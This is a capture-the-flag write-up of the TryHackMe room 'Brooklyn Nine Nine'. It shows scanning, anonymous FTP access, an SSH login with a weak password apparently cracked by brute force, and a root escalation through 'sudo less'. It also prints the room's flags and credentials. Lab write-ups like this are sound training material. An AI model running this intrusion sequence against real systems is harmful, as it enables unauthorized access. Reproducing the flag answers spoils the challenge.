# brooklyn-nine-nine — TryHackMe

```text
[ TARGET ] 10.67.155.96
[ ROOM   ] Brooklyn Nine Nine
[ GOAL   ] user.txt / root.txt
[ STATUS ] DONE
```

## 01 — Recon (nmap)

```console
$ nmap 10.67.155.96
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

→ Achado: FTP + SSH + HTTP. (raw: `recuperado.txt`)
→ Próximo: checar FTP anônimo.

## 02 — FTP anônimo

```console
$ nmap -p 21 --script ftp-anon 10.67.155.96
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--  note_to_jake.txt
```

```console
$ # conteúdo de note_to_jake.txt
From Amy,
Jake please change your password. It is too weak…
```

→ Achado: usuário **jake**, senha fraca. Artefato local: `note_to_jake.txt` (+ `brooklyn99.jpg` stego se usado).
→ Próximo: hydra/SSH em jake.

## 03 — SSH jake

```console
$ # [22][ssh] host: 10.67.155.96  login: jake  password: 987654321
$ ssh jake@10.67.155.96
jake@brookly_nine_nine:~$ find / -name "user.txt" 2>/dev/null
/home/holt/user.txt
$ cat /home/holt/user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

→ Achado: user flag em `/home/holt/user.txt`.
→ Próximo: privesc.

## 04 — Privesc (sudo less)

```console
$ sudo less /etc/passwd
# ! / bin via less → root shell
root@brookly_nine_nine:~# whoami
root
$ cat /root/root.txt
63a9f0ea7bb98050796b649e85481845
```

→ Achado: `sudo less` → root. Room concluída.

## FLAGS / RESPOSTAS

| Item | Valor |
|---|---|
| user.txt | `ee11cbb19052e40b07aac0ca060c23ee` |
| root.txt | `63a9f0ea7bb98050796b649e85481845` |
| jake SSH | `jake` / `987654321` |

## Artefatos

`recuperado.txt` · `note_to_jake.txt` · `brooklyn99.jpg`
